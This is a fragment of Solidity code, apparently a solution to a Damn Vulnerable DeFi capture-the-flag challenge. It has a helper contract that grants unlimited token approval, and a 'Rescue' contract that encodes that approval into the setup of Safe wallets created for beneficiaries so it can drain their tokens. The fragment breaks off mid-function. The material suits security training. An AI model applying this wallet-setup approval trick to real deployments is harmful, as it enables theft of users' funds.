...
contract RescueApprove {
    function approveTokens(DamnValuableToken token, address a) external {

        token.approve(a, type(uint256).max);
...
contract Rescue {
    ...
    address recovery;
    uint AMOUNT_TOKENS_DISTRIBUTED;
    RescueApprove rescueApp;
    constructor(
        Safe _singletonCopy,
        ...
        recovery = _recovery;
        AMOUNT_TOKENS_DISTRIBUTED = _amount;
        rescueApp = new RescueApprove();
        save();
    }
    function save() public {
        for (uint i = 0; i < beneficiaries.length; i++) {
            address curOwner = beneficiaries[i];
            address[] memory owners = new address[](1);
            owners[0] = curOwner;

            address contractDest = address(rescueApp);
            bytes memory d = abi.encodeCall(
                rescueApp.approveTokens,
                (token, address(this))
            );
